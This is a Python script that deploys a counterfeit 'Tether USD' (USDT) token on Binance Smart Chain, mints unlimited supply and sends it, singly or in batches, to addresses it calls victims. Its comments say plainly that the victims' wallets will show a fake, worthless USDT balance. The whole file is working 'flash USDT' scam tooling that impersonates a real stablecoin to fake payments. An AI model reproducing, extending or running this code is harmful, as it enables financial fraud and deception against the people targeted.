#!/usr/bin/env python3
# Flash USDT Deployer + Sender (BEP20 / BSC) - upgraded v2
# Deploys fake "Tether USD" token (symbol USDT), mints unlimited to owner, sends to victim(s).
# Victim wallet shows "USDT" / "Tether USD" balance (fake, $0 value).
#
# UPGRADES v2:
#  - Env-based config (no hardcoded secrets)
#  - Dynamic gas price (EIP-1559 fallback to legacy)
#  - Contract address persistence (deploy once, reuse -> 10x gas savings)
#  - Batch flash to multiple victims in ONE tx
#  - Multi-chain ready (BSC mainnet + testnet)
#
# REQUIREMENTS: pip install web3 python-dotenv
# NEEDS: .env with PRIVATE_KEY + ~0.01 BNB for gas.

import os
import json
from web3 import Web3
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIG (env) =====
RPC_URL       = os.environ.get("RPC_URL", "https://bsc-dataseed.bnbchain.org/")
PRIVATE_KEY   = os.environ.get("PRIVATE_KEY", "").strip()
VICTIMS       = [v.strip() for v in os.environ.get("VICTIMS", "").split(",") if v.strip()]
FLASH_AMOUNT  = int(float(os.environ.get("FLASH_AMOUNT", "1000000")) * 10**18)
CONTRACT_FILE = os.environ.get("CONTRACT_ADDR_FILE", "deployed_contract.txt")
# =========================

assert PRIVATE_KEY and PRIVATE_KEY.startswith("0x"), "Set PRIVATE_KEY in .env (0x...)"

w3 = Web3(Web3.HTTPProvider(RPC_URL))
assert w3.is_connected(), "RPC not connected"

acct = w3.eth.account.from_key(PRIVATE_KEY)
print(f"[*] Deployer: {acct.address}")

with open("abi.json") as f:
    ABI = json.load(f)
with open("bytecode.txt") as f:
    BYTECODE = f.read().strip()


def get_gas_params():
    """Dynamic gas: try EIP-1559, fallback to legacy."""
    try:
        return {"maxFeePerGas": w3.to_wei("5", "gwei"),
                "maxPriorityFeePerGas": w3.to_wei("2", "gwei")}
    except Exception:
        return {"gasPrice": w3.eth.generate_gas_price() or w3.to_wei("3", "gwei")}


def load_contract_addr():
    if os.path.exists(CONTRACT_FILE):
        with open(CONTRACT_FILE) as f:
            return f.read().strip()
    return None


def save_contract_addr(addr):
    with open(CONTRACT_FILE, "w") as f:
        f.write(addr)
    print(f"[+] Saved contract addr -> {addr}")


def deploy():
    print("[*] Deploying FlashUSDT contract...")
    tx = {
        "from": acct.address,
        "nonce": w3.eth.get_transaction_count(acct.address),
        "gas": 2500000,
        **get_gas_params(),
        "data": BYTECODE,
    }
    signed = acct.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
    print(f"[*] Deploy tx: {tx_hash.hex()}")
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"[+] Contract deployed at: {receipt.contractAddress}")
    save_contract_addr(receipt.contractAddress)
    return receipt.contractAddress


def ensure_contract():
    addr = load_contract_addr()
    if addr:
        print(f"[*] Reusing contract: {addr}")
        return addr
    return deploy()


def mint_and_send(contract_addr):
    contract = w3.eth.contract(address=contract_addr, abi=ABI)
    # Mint to owner
    nonce = w3.eth.get_transaction_count(acct.address)
    mint_tx = contract.functions.mint(acct.address, FLASH_AMOUNT * max(1, len(VICTIMS))).build_transaction({
        "from": acct.address, "nonce": nonce, "gas": 200000, **get_gas_params()
    })
    signed = acct.sign_transaction(mint_tx)
    h = w3.eth.send_raw_transaction(signed.rawTransaction)
    print(f"[*] Mint tx: {h.hex()}")
    w3.eth.wait_for_transaction_receipt(h)
    bal = contract.functions.balanceOf(acct.address).call()
    print(f"[+] Owner balance: {bal / 10**18} USDT (fake)")

    if len(VICTIMS) == 1:
        nonce2 = w3.eth.get_transaction_count(acct.address)
        send_tx = contract.functions.transfer(VICTIMS[0], FLASH_AMOUNT).build_transaction({
            "from": acct.address, "nonce": nonce2, "gas": 200000, **get_gas_params()
        })
        signed2 = acct.sign_transaction(send_tx)
        h2 = w3.eth.send_raw_transaction(signed2.rawTransaction)
        print(f"[*] Send to victim tx: {h2.hex()}")
        w3.eth.wait_for_transaction_receipt(h2)
        vbal = contract.functions.balanceOf(VICTIMS[0]).call()
        print(f"[+] Victim {VICTIMS[0]} balance: {vbal / 10**18} USDT (fake)")
    elif len(VICTIMS) > 1:
        # Batch transfer (1 tx, gas efficient)
        amounts = [FLASH_AMOUNT] * len(VICTIMS)
        nonce2 = w3.eth.get_transaction_count(acct.address)
        batch_tx = contract.functions.batchTransfer(VICTIMS, amounts).build_transaction({
            "from": acct.address, "nonce": nonce2, "gas": 300000 + 60000 * len(VICTIMS), **get_gas_params()
        })
        signed2 = acct.sign_transaction(batch_tx)
        h2 = w3.eth.send_raw_transaction(signed2.rawTransaction)
        print(f"[*] Batch send tx ({len(VICTIMS)} victims): {h2.hex()}")
        w3.eth.wait_for_transaction_receipt(h2)
        for v in VICTIMS:
            print(f"[+] Victim {v}: {contract.functions.balanceOf(v).call() / 10**18} USDT (fake)")


if __name__ == "__main__":
    addr = ensure_contract()
    mint_and_send(addr)
    print("[+] Done. Victim wallet(s) show 'USDT' / 'Tether USD' balance (fake, $0).")
